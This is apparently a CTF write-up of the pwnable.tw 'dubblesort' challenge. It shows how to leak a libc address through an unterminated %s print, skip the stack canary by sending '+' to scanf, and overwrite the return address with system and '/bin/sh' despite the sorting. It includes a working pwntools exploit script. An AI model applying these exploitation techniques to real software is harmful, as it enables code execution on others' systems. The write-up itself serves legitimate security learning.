+++
title = 'pwnable.tw Dubblesort'
date = 2025-02-08T00:45:26+08:00
draft = false
categories = ["CTF Writeup"]
series = ["pwnable.tw"]
tags = ["pwn", "oob-write", "stack-canary", "ret2libc"]
+++


This challenge leverages the behavior of the %s format specifier, which prints characters until it encounters a null terminator (\x00). By exploiting this property, it is possible to leak information about the libc base address. Additionally, the program contains an out-of-bounds (OOB) write operation; however, the writes are automatically sorted in ascending order. 

# Initial Analysis  

## File Analysis

```bash
file dubblesort 
dubblesort: ELF 32-bit LSB shared object, Intel 80386, version 1 (SYSV), dynamically linked, interpreter ./ld-2.23.so, for GNU/Linux 2.6.24, BuildID[sha1](/images/pwnabletw-dubblesort/)=12a217baf7cbdf2bb5c344ff14adcf7703672fb1, stripped

file libc_32.so.6 
libc_32.so.6: ELF 32-bit LSB shared object, Intel 80386, version 1 (GNU/Linux), dynamically linked, interpreter /lib/ld-linux.so.2, BuildID[sha1](/images/pwnabletw-dubblesort/)=d26149b8dc15c0c3ea8a5316583757f69b39e037, for GNU/Linux 2.6.32, stripped
```

```python
checksec --file ./dubblesort 
[*](/images/pwnabletw-dubblesort/) '/home/capang/Desktop/CTF/pwnable.tw/dubblesort/dubblesort'
    Arch:       i386-32-little
    RELRO:      Full RELRO
    Stack:      Canary found
    NX:         NX enabled
    PIE:        PIE enabled
    RUNPATH:    b'.'
    FORTIFY:    Enabled
```

Key Findings:-
1. The ELF is 32-bit/x86
2. The ELF is stripped
3. All standard security mitigations (Full RELRO, Stack Canary, NX, PIE, and FORTIFY) are enabled.

## Initial Testing

When starting the program, it first prompts for your name:

![image1.png](/images/pwnabletw-dubblesort/image1.png)

After entering your name, you’ll notice some extraneous bytes printed afterward. This hints at an exploitable behavior in the %s format specifier. Next, the program asks for the number of numbers you wish to sort before performing the sort:

![image2.png](/images/pwnabletw-dubblesort/image2.png)

## Analysis in Ghidra

Analyzing the binary in Ghidra reveals the following:

![image4.png](/images/pwnabletw-dubblesort/image4.png)
![image3.png](/images/pwnabletw-dubblesort/image3.png)

From the code snippet, we can see that the program prints the name using %s. Then it asks for the number of numbers to sort. Critically, there is no validation on the maximum number of numbers to be sorted, which introduces an opportunity for an OOB write.

## Analysis in GDB

### Validating Information Leakage

By loading the binary into GDB and setting a breakpoint at main+85 (before the name input), we can inspect the stack. For example:

![image5.png](/images/pwnabletw-dubblesort/image5.png)
![image6.png](/images/pwnabletw-dubblesort/image6.png)
![image7.png](/images/pwnabletw-dubblesort/image7.png)

The stack havent been zero'ed out making the `%s` format able to leak out information. Giving an input 'a' will make the stack look like this

![image8.png](/images/pwnabletw-dubblesort/image8.png)

This indicates that various addresses on the stack (within the space allocated for the name) can be leaked.

### Validating OOB Write

By providing a large number of numbers to sort, the program triggers stack smashing:

![image9.png](/images/pwnabletw-dubblesort/image9.png)

This confirms that an OOB write is occurring, which enables us to build a ROP chain.

### Key Takeways

- The name input can leak information.
- The leaked information includes a libc address.
- The offsets for the stack canary and the return address can be determined.
- With a crafted ROP chain, it is possible to redirect execution to libc’s `system` function and spawn a shell.

# Information Gathering

## Gaining Libc Base Address

Inspecting the stack before the name input shows that we can estimate the number of bytes needed and the values that will be leaked:

![image10.png](/images/pwnabletw-dubblesort/image10.png)

At the start of the stack, there is an address corresponding to libc_base + 0xe50d7, and at the fourth word, an address corresponding to libc_base + 0x8f82f. To obtain the libc base address, we can provide 16 characters. The following newline (\n) will fill in the least significant byte of the address. We then extract the first 3 bytes that have been leaked and append \x00.

The following code snippet shows how to leak and extract the address:

```python
io.sendlineafter(b' :',b'AAAAAAAAAAAAAAAA')
io.recvuntil(b'AAAAAAAAAAAAAAAA\n')
leaked =unpack(io.recv(3).rjust(4,b'\x00'))
info(f'leaked: {hex(leaked)}')
```
![image12.png](/images/pwnabletw-dubblesort/image12.png)
![image13.png](/images/pwnabletw-dubblesort/image13.png)

Since the leaked value has an offset of +0x8f800, subtracting this value gives us the libc base address. To locate the addresses of system and /bin/sh, we simply add their offsets (from the libc binary) to the libc base address:

Code:

```python
libc.address = leaked - 0x8f800
bin_sh = libc.address + 0x158e8b
system = libc.address + 0x3a940
info(f'libc base: {hex(libc.address)}')
```
## Finding offset for canary and ret address

By setting a breakpoint after the numbers have been input (e.g., at `main+229`), you can observe where the variables are placed in memory:

![image14.png](/images/pwnabletw-dubblesort/image14.png) ![image15.png](/images/pwnabletw-dubblesort/image15.png)

For the number at offset 0, it is stored at `ebp-0x7c`.

![image16.png](/images/pwnabletw-dubblesort/image16.png)

The stack canary is located at `ebp-0x1c`, and the return address is at `ebp+4`.

![image17.png](/images/pwnabletw-dubblesort/image17.png)

Thus, the canary is at offset 24, and the return address is at offset 32.

### Bypassing the Canary

Although the canary value cannot be directly leaked, our analysis in Ghidra shows that the number inputs are processed using the `%d` format. By providing a non-numerical input (e.g., a `+`), the `scanf` call does not overwrite the canary value. For example:

- Providing a numerical input at offset 24:
    
    ![image18.png](/images/pwnabletw-dubblesort/image18.png)
    
- Providing non-numerical input at offset 24:
    
    ![image19.png](/images/pwnabletw-dubblesort/image19.png)
    

This bypasses the stack canary.

## Key Takeaways:

1. Provide 16 characters as input to leak a libc address.
2. The libc address is obtained by subtracting `0x8f800` from the leaked value.
3. At offset 24, supply non-numerical input (a `+`) to avoid overwriting the canary.
4. At offset 32, input the address of `system`.
5. At offset 33, input the address of the `/bin/sh` string.
 
# Exploitation Phase

With all necessary information gathered, we must now consider that the numbers will be sorted in ascending order. For instance:

![image20.png](/images/pwnabletw-dubblesort/image20.png)

The address of `/bin/sh` is larger than that of `system`. This does not affect the alignment for ROPing. However, note that the canary value is random. Although the probability of failure is low, if the canary value is larger than expected, the exploit might not work.

The following diagram summarizes the exploit structure:

![image21.png](/images/pwnabletw-dubblesort/image21.png)

Below is the final exploitation code:

```python
io.sendlineafter(b' :',b'36')
sleep(1)
for i in range(24):
    io.sendlineafter(b' : ',b'1')
io.sendlineafter(b' : ',b'+')
for i in range(33-25):
    io.sendlineafter(b' : ',str(system))
for i in range(3):
    io.sendlineafter(b' : ',str(bin_sh))
```

![image22.png](/images/pwnabletw-dubblesort/image22.png)


